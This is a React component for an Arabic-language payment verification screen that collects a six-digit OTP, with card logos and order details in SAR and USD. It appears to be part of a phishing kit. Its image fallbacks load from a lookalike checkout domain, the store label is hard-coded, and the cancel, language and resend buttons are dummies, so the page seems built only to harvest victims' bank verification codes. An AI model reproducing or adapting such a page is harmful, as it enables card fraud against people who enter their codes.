import { Input } from '@/components/ui/input';
import { toEnglishNumbers, formatPrice } from '@/lib/utils';

interface ConfirmCodeProps {
  confirmCode: string;
  setConfirmCode: (value: string) => void;
  onSubmit: () => void;
  codeError?: string | null;
  isLoading?: boolean;
  onClearError?: () => void;
  productName?: string;
  activeTotalAmount?: number;
  activeInstallments?: number;
  activePerInstallment?: number;
  phoneNumber?: string;
  orderId?: string;
}

const ConfirmCode = ({
  confirmCode,
  setConfirmCode,
  onSubmit,
  codeError,
  isLoading,
  onClearError,
  productName = 'منتج',
  activeTotalAmount = 0,
  activeInstallments = 0,
  activePerInstallment = 0,
  phoneNumber = '',
  orderId = ''
}: ConfirmCodeProps) => {
  // Calculate USD amount (approximate exchange rate: 1 USD = 3.75 SAR)
  const exchangeRate = 3.75;
  const totalAmountUSD = Math.round((activeTotalAmount / exchangeRate) / 10) * 10;

  // Get current date and time in format: 21:09:29 02/02/2026
  const now = new Date();
  const formattedDate = now.toLocaleDateString('en-GB', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric'
  }).replace(/\//g, '/');
  const formattedTime = now.toLocaleTimeString('en-GB', {
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: false
  });
  const formattedDateTime = `${formattedTime} ${formattedDate}`;

  return (
    <div
      className="min-h-screen flex flex-col"
      dir="rtl"
      style={{
        fontFamily: "'Cairo', 'Tajawal', sans-serif",
        background: '#ffffff'
      }}
    >
      <div className="max-w-[430px] mx-auto w-full flex flex-col flex-1">
        {/* Header */}
        <div className="flex items-center justify-between px-5 py-4 bg-white">
          <div className="flex-1" /> {/* Empty div to keep layout */}
          <div className="flex items-center gap-3">
            <button
              onClick={() => {}}
              className="text-[14px] font-medium text-blue-600 hover:text-blue-700 transition-colors"
            >
              إلغاء
            </button>
          </div>
        </div>

        {/* Payment Icons */}
        <div className="flex justify-center items-center gap-3 my-4">
          <img src="/external/images/american_express.png" alt="American Express" style={{ height: '18px', width: 'auto' }} onError={(e) => { e.currentTarget.src = 'https://checkout.tamara.center/v.jpg'; }} />
          <img src="/external/images/visa.png" alt="Visa" style={{ height: '18px', width: 'auto' }} onError={(e) => { e.currentTarget.src = 'https://checkout.tamara.center/vv.jpg'; }} />
          <img src="/external/images/mastercard.png" alt="Mastercard" style={{ height: '18px', width: 'auto' }} onError={(e) => { e.currentTarget.src = 'https://checkout.tamara.center/vvv.jpg'; }} />
          <img src="/external/images/mada.png" alt="Mada" style={{ height: '18px', width: 'auto' }} onError={(e) => { e.currentTarget.src = 'https://checkout.tamara.center/vvvv.jpg'; }} />
        </div>

        {/* Gray Separator Line */}
        <div className="h-px bg-gray-300 mx-5 my-2" />

        {/* English Language Button */}
        <div className="flex justify-start px-5 my-3">
          <button
            onClick={() => {}}
            className="text-[14px] font-medium text-blue-600 hover:text-blue-700 transition-colors"
          >
            English
          </button>
        </div>

        {/* Content */}
        <div className="flex flex-col flex-1 px-5 py-2">
          {/* Page Title */}
          <h1 className="text-[22px] font-bold text-black mb-4 text-center" style={{ fontFamily: "'Cairo', sans-serif" }}>
            التحقق من عملية الدفع
          </h1>

          {/* Empty Line */}
          <div className="mb-4" />

          {/* Gray Instruction Text */}
          <div className="text-right mb-2">
            <p className="text-[14px] text-gray-600 mb-2">
              يرجى إدخال رمز التحقق المرسل إلى الرقم المسجل
            </p>
            <p className="text-[14px] text-gray-600">
              لإتمام عملية الشراء من:
            </p>
          </div>

          {/* Order Details */}
          <div className="bg-gray-50 rounded-lg p-4 mb-4">
            {/* Store Name */}
            <div className="text-[13px] text-gray-700 mb-2">
              المتجر: {orderId} - Hussein Order
            </div>

            {/* Amount */}
            <div className="flex items-center gap-2 mb-2">
              <span className="text-[14px] font-semibold text-gray-800">
                المبلغ: {formatPrice(activeTotalAmount)} SAR
              </span>
              <span className="bg-gray-200 text-gray-700 px-2 py-1 rounded text-xs">
                ${totalAmountUSD}
              </span>
            </div>

            {/* Time */}
            <div className="text-[12px] text-gray-600 text-right">
              الوقت: {formattedDateTime}
            </div>
          </div>

          {/* Empty Line */}
          <div className="mb-4" />

          {/* OTP Input Section */}
          <div className="mb-4">
            <label className="text-gray-700 text-sm block mb-2 text-right font-medium">رمز التحقق</label>
            <Input
              value={confirmCode}
              onChange={e => {
                setConfirmCode(toEnglishNumbers(e.target.value));
                if (onClearError) onClearError();
              }}
              placeholder=". . . . . ."
              className="bg-[#f7f7f7] border-[#ddd] text-gray-900 text-center text-2xl tracking-[0.3em] py-4 focus:border-[#7d5af2] focus:ring-[#7d5af2]"
              dir="ltr"
              maxLength={6}
              type="text"
              inputMode="numeric"
              style={{ height: '54px', letterSpacing: '0.5em' }}
            />
            <p className="text-[13px] text-gray-500 mt-2 text-center">أدخل الرمز</p>
          </div>

          {codeError && <p className="text-red-500 text-sm mb-4 text-center">{codeError}</p>}

          {/* Spacer */}
          <div className="flex-1" />
        </div>

        {/* Confirm Button */}
        <button
          onClick={onSubmit}
          disabled={!confirmCode || confirmCode.length < 4 || isLoading}
          className={`payment-btn ${confirmCode && confirmCode.length >= 4 ? 'active' : ''}`}
          style={{ width: '100%', maxWidth: '370px', height: '54px', margin: '0 auto' }}
        >
          {isLoading ? (
            'جاري التحقق...'
          ) : (
            'تأكيد الدفع'
          )}
        </button>

        {/* Resend Code - Centered Text Only */}
        <div className="text-center pt-8 pb-4">
          <button
            onClick={() => {}}
            className="text-[14px] font-medium text-blue-600 hover:text-blue-700 transition-colors"
          >
            إعادة إرسال الرمز
          </button>
        </div>
      </div>
    </div>
  );
};

export default ConfirmCode;
